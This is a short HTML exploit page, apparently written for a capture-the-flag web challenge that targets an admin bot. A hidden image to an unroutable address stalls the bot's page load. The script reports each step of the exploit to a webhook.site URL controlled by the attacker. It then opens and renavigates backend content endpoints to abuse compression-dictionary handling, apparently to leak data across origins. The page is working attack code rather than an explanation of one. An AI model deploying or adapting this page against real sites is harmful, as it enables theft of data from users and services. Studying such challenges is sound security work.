<!doctype html>
<html><head><meta charset="utf-8"><title>a</title></head>
<body><h1>loading</h1>
<!-- hanging resource keeps page from networkidle0 so bot goto() waits ~10s -->
<img src="http://10.255.255.1/keepalive" style="display:none">
<script>
const q = new URLSearchParams(location.search);
const B = (q.get('b') || 'http://backend:8080').replace(/\/+$/,'');
const P = '2';
const WT = q.get('w') || '';
function bx(s){ if(WT) new Image().src='https://webhook.site/'+WT+'/S?'+s+'&t='+Date.now(); }
bx('step=loaded&ver=d1&B='+encodeURIComponent(B));
// register RB dict by loading /api/content/P/1 DIRECTLY (only this dict gets registered,
// so the confused /2 nav decompresses against RB exactly). Avoid /post/P (its inline script
// fetches /2 and would register the decoded doc as a competing dictionary).
const w = window.open(B + '/api/content/' + P + '/1', 'x');
setTimeout(function(){ bx('step=nav'); try { w.location = B + '/api/content/' + P + '/2'; } catch (e) {} }, 3000);
</script>
</body></html>
